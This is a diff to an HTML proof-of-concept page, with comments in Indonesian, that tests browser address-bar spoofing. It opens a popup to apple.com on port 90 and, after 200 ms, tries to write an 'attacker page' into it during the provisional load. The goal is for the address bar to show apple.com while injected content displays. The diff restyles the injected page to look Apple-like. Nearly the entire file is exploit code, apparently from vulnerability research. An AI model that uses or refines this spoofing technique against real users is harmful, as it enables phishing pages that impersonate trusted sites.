@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Direct URL Spoofing PoC</title>
+    <title>Direct Target Force PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -44,7 +44,7 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE DIRECT SPOOF TEST</button>
+      <button id="execBtn">FORCE APPLE.COM:90 ADDRESS BAR</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
@@ -53,13 +53,13 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Initializing direct URL dispatch...";
+        statusInfo.innerText = "Status: Forcing direct navigation to target URL...";
         this.style.display = "none";
 
         try {
-          // Membuka jendela baru langsung dengan target URL (misalnya apple.com:90)
-          // untuk memaksa bilah alamat segera mencoba memuat URL tersebut tanpa tertahan di about:blank
-          let targetWindow = window.open("https://apple.com", "_blank");
+          // Membuka jendela baru dengan langsung menyertakan URL target pada parameter window.open
+          // Ini memaksa bilah alamat langsung menampilkan "apple.com:90" alih-alih "about:blank"
+          let targetWindow = window.open("https://apple.com:90", "_blank");
 
           if (!targetWindow) {
             statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
@@ -67,9 +67,9 @@
             return;
           }
 
-          statusInfo.innerText = "Status: Target URL dispatched to address bar.";
+          statusInfo.innerText = "Status: Address bar forced to apple.com:90. Attempting injection race...";
 
-          // Mencoba menyuntikkan dokumen jika celah waktu (race window) mengizinkan sebelum koneksi port 90 gagal
+          // Mencoba menyuntikkan dokumen penyerang pada celah waktu muat awal (provisional load)
           setTimeout(() => {
             try {
               let attackerPayload = `
@@ -80,31 +80,35 @@
                   <title>Attacker Page</title>
                   <style>
                     body {
-                      margin: 0; background: #000000; color: #00ff00;
-                      font-family: monospace; display: flex; align-items: center; 
-                      justify-content: center; height: 100vh; text-align: center;
+                      margin: 0; background: #ffffff; color: #1d1d1f;
+                      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+                      display: flex; align-items: center; justify-content: center;
+                      height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
                     }
-                    h1 { font-size: 32px; color: #ff0000; }
+                    .wrapper { width: 100%; max-width: 500px; }
+                    h1 { font-size: 40px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
+                    p { font-size: 22px; color: #0066cc; font-weight: 500; margin: 0; }
                   </style>
                 </head>
                 <body>
-                  <div>
-                    <h1>ATTACKER PAGE INJECTED</h1>
-                    <p>Forced Over Port 90 State</p>
+                  <div class="wrapper">
+                    <h1>NOT APPLE</h1>
+                    <p>Forced Content Injection Test</p>
                   </div>
                 </body>
                 </html>
               `;
-              
-              // Mencoba menulis ke dokumen target (akan dibatasi SOP jika navigasi lintas domain berhasil, 
-              // tetapi diuji untuk melihat perilaku penanganan bilah alamat)
+
               targetWindow.document.open();
               targetWindow.document.write(attackerPayload);
               targetWindow.document.close();
+
+              statusInfo.innerText = "Status: Injection executed successfully.";
             } catch (innerErr) {
-              console.debug("Cross-origin injection restricted by browser policy:", innerErr.message);
+              // Jika browser modern memblokir karena perbedaan origin atau proteksi commit, blok ini menangkapnya
+              statusInfo.innerText = "Status: Blocked by browser SOP/Commit policy: " + innerErr.message;
             }
-          }, 300);
+          }, 200);
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error: " + err.message;
